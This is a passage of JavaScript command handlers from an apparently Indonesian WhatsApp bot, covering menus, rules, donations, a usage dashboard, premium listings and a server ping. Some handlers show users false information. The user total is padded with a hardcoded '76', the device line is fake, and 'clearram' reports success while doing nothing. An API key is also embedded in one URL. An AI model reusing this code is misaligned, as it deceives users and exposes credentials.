case'allmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: allMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case'menu': case'simplemenu': case'help':{
//await botjawab()
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: simpleMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'mainmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: mainMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'convertmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: convertMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'anonymousmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: anonymousMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'storemenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: storeMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'rpgmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: rpgMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'gamemenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: gameMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'groupmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: groupMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'downloadmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: downloadMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'searchmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: searchMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'randommenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: randomMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'randomquotes':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: randomQuotes(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'cewekasiamenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: cewekMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'cowokasiamenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: cowokMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'balancemenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: balanceMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'ownermenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: ownerMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'storagemenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: storageMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'asupanmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: asupanMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'randomsticker':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: randomSticker(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'stalkingmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: stalkingMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'imageeffect':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: imageEffect(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'funmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: funMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'islammenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: islamMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'bugmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: bugMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'nsfwmenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: nsfwMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'textpromenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: textproMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'photooxymenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: photooxyMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'ephotomenu': case 'ephoto360menu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: ephotoMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case 'logomenu':{
let mundur = hitungmundur(1, 1, 2024)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
await juna.sendMessage(m.chat, {
text: logoMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case'rules': case'aturan': case'aturanbot':{
var cpt = `Peraturan Penggunaan Bot :\n- Dilarang Spam\n- Dilarang Menelpon Bot\n- Dilarang Mengirim Virus Ke Bot\n\nCatatan :\nSemua Fitur Bot Di Lakukan Secara Otomatis Oleh Sistem Tanpa Ada Campur Tangan Owner, Dan Semua Informasimu Seperti Chat, Foto, Video Atau Vn Akan Aman Tanpa Di Sebar, Dan Jika Ada Balasan Yang Absurd Atau Sticker Absurd Ya Mungkin Owner Lagi Gabut Dan Butuh Temen Chat :v`
await juna.sendMessage(m.chat, {
text: cpt,
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
case'infobot': case'info': case'botinfo':{
addCountCmd('infobot', m.sender, _cmd)
var capt = `_*${botName} Information*_

*• Name :* ${juna.user.name}
*• Number :* ${botNumber.split("@")[0]}
*• Owner :* ${prefix}owner
*• Total Pengguna :* 76${pendaftar.length}
*• Prefix :* ${prefix}


_*FITUR Information*_

*• Total :* 933 Fitur
*• Error :* 37 Fitur
*• Anti Hapus :* ${setting.antiDelete ? 'Aktif 🟢' : 'Mati 🔴'}
*• Anti Call :* ${setting.anticall ? 'Aktif 🟢' : 'Mati 🔴'}
*• Anti View One :* ${setting.antiViewOnce ? 'Aktif 🟢' : 'Mati 🔴'}
*• Auto Bio :* ${setting.autobio ? 'Aktif 🟢' : 'Mati 🔴'}
*• Auto Blok 212 :* ${setting.autoblok212 ? 'Aktif 🟢' : 'Mati 🔴'}
*• Auto Respond :* ${setting.autorespond ? 'Aktif 🟢' : 'Mati 🔴'}
*• Auto Read :* ${setting.autoread ? 'Aktif 🟢' : 'Mati 🔴'}
*• PC only :* ${setting.pconly ? 'Aktif 🟢' : 'Mati 🔴'}
*• GC only :* ${setting.gruponly ? 'Aktif 🟢' : 'Mati 🔴'}
`
await juna.sendMessage(m.chat, {
text: capt,
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
 break
case'donate': case'donasi':
addCountCmd('donate', m.sender, _cmd)
var cp = `Hai Kak, Ingin Donasi?, Silahkan Donasi Ke Payment Yang Ada Di Bawah, Dengan Kamu Berdonasi Berarti Kamu Berkontribusi Dalam Perkembangan Bot Ini..\n❏──「 *Payment* 」\n│ • *Trakteer:* ${setting.trakteer}\n│ • *Saweria:* ${setting.saweria}\n❏──────────────๑\n\nTerima Kasih Yang Sudah Donasi, Berapapun Donasi Kamu Akan Sangat Saya Hargain >,<`
await juna.sendMessage(m.chat, { image: fs.readFileSync(setting.fotoDonasi), caption: cp}, {quoted:fkontak})
break;
case 'pay': case 'payment':
var pay = `Halo Kak Untuk Pembayaran Bisa Scan Qr Tersebut Atau Bisa Dengan Pembayaran Lain Silahkan Hubungi Owner`
await juna.sendMessage(m.chat, {image: fs.readFileSync(setting.fotoDonasi), caption: pay}, {quoted:fkontak})
break
case 'dashboard':
addCountCmd('dashboard', m.sender, _cmd)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
_cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
_cmd.sort((a, b) => (a.count < b.count) ? 1 : -1)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
var jumlahCmd = _cmd.length
if (jumlahCmd > 10) jumlahCmd = 10
var jumlah = _cmdUser[posi].db.length
if (jumlah > 5) jumlah = 5
var totalUser = 0
for (let x of _cmdUser[posi].db) {
totalUser = totalUser + x.count
}
var total = 0
for (let o of _cmd) {
total = total + o.count
}
var teks = `▢━━「 *DASHBOARD* 」━━▢\n\n*乂 PENGGUNAAN*\n• GLOBAL : ${total}\n• ANDA : ${totalUser}\n\n`
teks += `*乂 COMMAND GLOBAL*\n\n`
for (let u = 0; u < jumlahCmd; u ++) {
teks += `• *#${_cmd[u].nama} dipakai* ${_cmd[u].count} *kali*\n`
}
teks += `\n*乂 COMMAND USER*\n\n`
for (let i = 0; i < jumlah; i ++) {
teks += `• *#${_cmdUser[posi].db[i].nama} dipakai* ${_cmdUser[posi].db[i].count} *kali*\n`
}
let datan = `https://quickchart.io/chart?bkg=white&c=%7B%0A%20%20type%3A%20%27bar%27%2C%0A%20%20data%3A%20%7B%0A%20%20%20%20labels%3A%20%5B%27${_cmd[0].nama}%27%2C%20%27${_cmd[1].nama}%27%2C%20%27${_cmd[2].nama}%27%2C%20%27${_cmd[3].nama}%27%2C%20%27${_cmd[4].nama}%27%2C%20%27${_cmd[5].nama}%27%2C%20%27${_cmd[6].nama}%27%2C%20%27${_cmd[7].nama}%27%2C%20%27${_cmd[8].nama}%27%2C%20%27${_cmd[9].nama}%27%5D%2C%0A%20%20%20%20datasets%3A%20%5B%7B%0A%20%20%20%20%20%20label%3A%20%27Penggunaan%20Command%27%2C%0A%20%20%20%20%20%20data%3A%20%5B${_cmd[0].count}%2C%20${_cmd[1].count}%2C%20${_cmd[2].count}%2C%20${_cmd[3].count}%2C%20${_cmd[4].count}%2C%20${_cmd[5].count}%2C%20${_cmd[6].count}%2C%20${_cmd[7].count}%2C%20${_cmd[8].count}%2C%20${_cmd[9].count}%5D%0A%20%20%20%20%7D%5D%0A%20%20%7D%0A%7D`
juna.sendMessage(m.chat, { image: { url: datan }, caption: teks}, { quoted: m})
//m.reply(teks)
break
case 'owner': case 'creator': {
await juna.sendContact(m.chat, ownerNumber.map( i => i.split("@")[0]), m)
await juna.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_owner), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'lopyu': {
if (!isCreator) return m.reply('Lu Siapa Gw Ga Kenal Gausah Gatel Lopyu" Segala Anj')
await juna.sendMessage(m.chat, {audio: fs.readFileSync('./media/sound/lopyou.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'cekdrive': case'drive':
var result = await nou.drive.info();
addCountCmd('cekdrive', m.sender, _cmd)
m.reply(`*Drive Server Info*\n\n *• Total :* ${result.totalGb} GB\n *• Used :* ${result.usedGb} GB (${result.usedPercentage}%)\n *• Free :* ${result.freeGb} GB (${result.freePercentage}%)`)
break
case 'cekbandwidth': case'bandwidth':
m.reply(mess.wait);
addCountCmd('cekbandwidth', m.sender, _cmd)
var { download, upload } = await checkBandwidth();
m.reply(`*Bandwidth Server*\n\n*>* Upload : ${upload}\n*>* Download : ${download}`)
break
case 'cekprem': case'cekpremium':
if (!isPremium) return m.reply(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
addCountCmd('cekpremium', m.sender, _cmd)
if (isCreator) return m.reply(`Khusus user aja bkn untuk owner`)
if (_prem.getPremiumExpired(m.sender, premium) == "PERMANENT") return m.reply(`PERMANENT`)
let cekvip = ms(_prem.getPremiumExpired(m.sender, premium) - Date.now())
let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
m.reply(premiumnya)
break
case 'listpremium': case'listprem':
addCountCmd('listpremium', m.sender, _cmd)
let txt = `*List Premium User*\nJumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expire :* PERMANENT\n\n`
} else {
let cekvip = ms(i.expired - Date.now())
txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
juna.sendTextWithMentions(m.chat, txt, m)
break
case 'listsewa':
let list_sewa_list = `*LIST-SEWA-GROUP*\n\n*Total:* ${sewa.length}\n\n`
let data_array = [];
for (let x of sewa) {
addCountCmd('listsewa', m.sender, _cmd)
list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
if (x.expired === 'PERMANENT') {
let ceksewa = 'PERMANENT'
list_sewa_list += `*Expire :* PERMANENT\n\n`
} else {
let ceksewa = ms(x.expired - Date.now())
list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
}
}
juna.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
break
case 'clearram': {
      var ramUsage = process.memoryUsage().rss
         clearInterval(ramUsage)
         m.reply(`Succes Me-reset Ram Server...`)
         }
         break
case'speed': case'ping':{
const used = process.memoryUsage();
let timestamp = speed();
let latensi = speed() - timestamp;
let neww = performance.now();
let oldd = performance.now();
var tot = await nou.drive.info();
let respon = `*_Jaringan Server_*
Ping: ${latensi.toFixed(4)} _Second_ 

*_Info Server_*
Device: iPhone 11
Versi: IOS 14.3.1 (c)
Type Nirkabel: Wi-Fi

RAM :
• Total: ${formatp(os.totalmem())}
• Digunakan: ${formatp(os.totalmem() - os.freemem())}

PENYIMPANAN :
• Total: ${tot.totalGb} GB
• Digunakan: ${tot.usedGb} GB (${tot.usedPercentage}%)
• Tersedia: ${tot.freeGb} GB (${tot.freePercentage}%)

*_Runtime Server_*
Aktif: ${runtime(process.uptime())}

*_NodeJS Memory Usaage_*
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}
`.trim();
let imgso = `https://quickchart.io/chart?v=2.9.4&c=%7B%0A%20%20%22type%22%3A%20%22outlabeledPie%22%2C%0A%20%20%22data%22%3A%20%7B%0A%20%20%20%20%22labels%22%3A%20%5B%22Digunakan%22%2C%20%22Tersedia%22%5D%2C%0A%20%20%20%20%22datasets%22%3A%20%5B%7B%0A%20%20%20%20%20%20%20%20%22backgroundColor%22%3A%20%5B%22%23DB1C01%22%2C%20%22%2327AC02%22%5D%2C%0A%20%20%20%20%20%20%20%20%22data%22%3A%20%5B${tot.usedPercentage}%2C%20${tot.freePercentage}%5D%0A%20%20%20%20%7D%5D%0A%20%20%7D%2C%0A%20%20%22options%22%3A%20%7B%0A%20%20%20%20%22plugins%22%3A%20%7B%0A%20%20%20%20%20%20%22legend%22%3A%20false%2C%0A%20%20%20%20%20%20%22outlabels%22%3A%20%7B%0A%20%20%20%20%20%20%20%20%22text%22%3A%20%22%25l%20%25p%22%2C%0A%20%20%20%20%20%20%20%20%22color%22%3A%20%22white%22%2C%0A%20%20%20%20%20%20%20%20%22stretch%22%3A%2035%2C%0A%20%20%20%20%20%20%20%20%22font%22%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%22resizable%22%3A%20true%2C%0A%20%20%20%20%20%20%20%20%20%20%22minSize%22%3A%2012%2C%0A%20%20%20%20%20%20%20%20%20%20%22maxSize%22%3A%2018%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%7D%0A%7D`
juna.sendMessage(m.chat, { image: { url: imgso }, caption: respon}, { quoted: m})
/*juna.relayMessage(m.chat,  {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: 10000000,
      requestFrom: '0@s.whatsapp.net',
      noteMessage: {
      extendedTextMessage: {
      text: respon,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})*/
}
break
case 'infogempa':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
m.reply(mess.wait)
let ani = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=GataDios`)
let anu = ani.result
const waktu = anu.waktu
const magnitude = anu.magnitude
const kedalaman = anu.kedalaman
const koordinat = anu.koordinat
const lokasi = anu.lokasi
const potensi = anu.potensi
juna.sendMessage(m.chat, { image: { url: anu.map }, caption: `Waktu : ${waktu}\nMagnitude : ${magnitude}\nKedalaman : ${kedalaman}\nKoordinat : ${koordinat}\nLokasi : ${lokasi}\nPotensi : ${potensi}\n\nData Berdasarkan: https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg`}, {quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'kisahnabi':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
